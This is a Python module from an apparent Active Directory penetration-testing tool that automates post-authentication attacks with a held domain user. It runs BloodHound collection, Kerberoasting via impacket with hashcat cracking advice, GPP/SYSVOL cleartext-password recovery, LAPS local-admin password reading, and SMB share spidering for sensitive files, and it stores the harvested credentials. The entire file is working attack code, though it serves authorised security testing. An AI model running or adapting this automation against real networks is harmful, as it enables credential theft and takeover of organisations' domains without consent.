"""Authenticated enumeration with a held domain user: BloodHound collection,
Kerberoasting, GPP/SYSVOL secrets, LAPS, share spidering."""
from __future__ import annotations

import glob
import json
import os

from ..core.config import Config
from ..core.log import get_logger
from ..core.models import (
    ADUser, Credential, Finding, Phase, SecretType, Severity, Share,
)
from ..core.runner import Runner
from ..core.state import State
from . import parsers

log = get_logger(__name__)


def run(cfg: Config, state: State, runner: Runner) -> None:
    if not cfg.has_creds():
        log.warning("no credentials configured; skipping authed module")
        return
    dc = cfg.dc_ip or (state.dcs()[0].ip if state.dcs() else None)
    if not dc:
        log.warning("no DC known; run discovery first")
        return

    _bloodhound(cfg, state, runner, dc)
    _kerberoast(cfg, state, runner, dc)
    _gpp(cfg, state, runner, dc)
    _laps(cfg, state, runner)
    _shares_spider(cfg, state, runner)


def _auth_args(cfg: Config) -> str:
    if cfg.nt_hash:
        return f"-u {cfg.username} -H {cfg.nt_hash}"
    return f"-u {cfg.username} -p {cfg.password}"


def _bloodhound(cfg, state, runner, dc) -> None:
    if not runner.have("bloodhound-python"):
        return
    log.info("collecting BloodHound data")
    secret = f"-p {cfg.password}" if cfg.password else f"--hashes :{cfg.nt_hash}"
    res = runner.run(
        f"bloodhound-python -d {cfg.domain} -u {cfg.username} {secret} "
        f"-ns {dc} -c All --zip", label="bloodhound",
    )
    if res.returncode == 0:
        state.add_finding(Finding(
            category="bloodhound", title="BloodHound collection complete",
            detail="Ingest the .zip in the BloodHound GUI to review paths.",
            severity=Severity.INFO, source_module="authed",
            evidence=str(res.logfile),
            mindmap_node="Authed > Situational awareness > BloodHound",
            phase=Phase.AUTHED,
        ))


def _kerberoast(cfg, state, runner, dc) -> None:
    if not runner.have("impacket-GetUserSPNs"):
        return
    log.info("kerberoasting SPN accounts")
    cred = f"{cfg.username}:{cfg.password}" if cfg.password else cfg.username
    hashflag = "" if cfg.password else f" -hashes :{cfg.nt_hash}"
    res = runner.run(
        f"impacket-GetUserSPNs {cfg.domain}/{cred}{hashflag} -dc-ip {dc} "
        "-request -outputfile kerb.hashes", label="kerberoast",
    )
    for name in parsers.parse_spn_users(res.stdout):
        state.upsert_user(ADUser(username=name, domain=cfg.domain or "",
                                 spn="(kerberoastable)"))
    if "$krb5tgs$" in res.stdout:
        state.add_finding(Finding(
            category="kerberos", title="Kerberoastable SPN account(s)",
            detail="Service tickets saved to kerb.hashes; crack with hashcat -m 13100.",
            severity=Severity.HIGH, source_module="authed",
            evidence=str(res.logfile),
            mindmap_node="Authed > Kerberos > Kerberoasting", phase=Phase.AUTHED,
        ))


def _gpp(cfg, state, runner, dc) -> None:
    if not runner.have("nxc"):
        return
    log.info("hunting GPP cpassword in SYSVOL")
    res = runner.run(
        f"nxc smb {dc} {_auth_args(cfg)} -M gpp_password -M gpp_autologin",
        label="gpp",
    )
    creds = parsers.parse_gpp(res.stdout)
    for c in creds:
        state.add_credential(Credential(
            username=c.username, domain=c.domain or cfg.domain or "",
            secret=c.password, secret_type=SecretType.PASSWORD,
            source="gpp", validated=False,
        ))
    if creds:
        state.add_finding(Finding(
            category="creds",
            title=f"GPP/autologin credentials recovered ({len(creds)})",
            detail="Cleartext creds from SYSVOL: "
                   + ", ".join(c.username for c in creds),
            severity=Severity.HIGH, source_module="authed",
            evidence=str(res.logfile),
            mindmap_node="Authed > SYSVOL > GPP cpassword", phase=Phase.AUTHED,
        ))


def _laps(cfg, state, runner) -> None:
    if not runner.have("nxc") or not state.dcs():
        return
    dc = cfg.dc_ip or state.dcs()[0].ip
    log.info("checking LAPS readability")
    res = runner.run(f"nxc smb {dc} {_auth_args(cfg)} --laps", label="laps")
    pairs = parsers.parse_laps(res.stdout)
    for computer, pw in pairs:
        # LAPS password is the local Administrator for that computer
        state.add_credential(Credential(
            username="administrator", domain=computer, secret=pw,
            secret_type=SecretType.PASSWORD, source="laps",
            validated=True, admin_on=[computer],
            notes=f"LAPS local admin on {computer}",
        ))
    if pairs:
        state.add_finding(Finding(
            category="creds", title=f"LAPS passwords readable ({len(pairs)})",
            detail="Local admin passwords for: "
                   + ", ".join(c for c, _ in pairs),
            severity=Severity.HIGH, source_module="authed",
            evidence=str(res.logfile),
            mindmap_node="Authed > LAPS > Readable passwords", phase=Phase.AUTHED,
        ))


# spider_plus writes JSON per host under one of these (varies by nxc version)
_SPIDER_DIRS = [
    os.path.expanduser("~/.nxc/modules/nxc_spider_plus"),
    os.path.expanduser("~/.cme/modules/nxc_spider_plus"),
    "/tmp/nxc_hosted/nxc_spider_plus",
]
_MED_CAP = 20  # cap medium-signal file findings


def _shares_spider(cfg, state, runner) -> None:
    if not runner.have("nxc"):
        return
    targets = " ".join(h.ip for h in state.hosts() if 445 in h.ports)
    if not targets:
        targets = cfg.dc_ip or (state.dcs()[0].ip if state.dcs() else "")
    if not targets:
        return
    log.info("spidering readable shares for sensitive files")
    runner.run(f"nxc smb {targets} {_auth_args(cfg)} -M spider_plus",
               label="spider")

    search_dirs = _SPIDER_DIRS + [cfg.loot_dir, "."]
    files = []
    for d in search_dirs:
        if os.path.isdir(d):
            files += glob.glob(os.path.join(d, "*.json"))
    med = 0
    for jf in files:
        host = os.path.splitext(os.path.basename(jf))[0]
        try:
            data = json.loads(open(jf, encoding="utf-8").read())
        except Exception:
            continue
        for hit in parsers.parse_spider_json(data):
            if hit.level == "medium":
                med += 1
                if med > _MED_CAP:
                    continue
            state.upsert_share(Share(host=host, name=hit.share, readable=True))
            state.add_finding(Finding(
                category="loot",
                title=f"Sensitive file: \\\\{host}\\{hit.share}\\{hit.path}",
                detail=f"{hit.reason} ({hit.size})",
                severity=Severity.HIGH if hit.level == "high" else Severity.LOW,
                source_module="authed",
                evidence=f"{host}|{hit.share}|{hit.path}",
                mindmap_node="Authed > Shares > Sensitive files",
                phase=Phase.AUTHED,
            ))
    if med > _MED_CAP:
        log.info("(%d more medium-signal files not recorded; see loot dir)",
                 med - _MED_CAP)
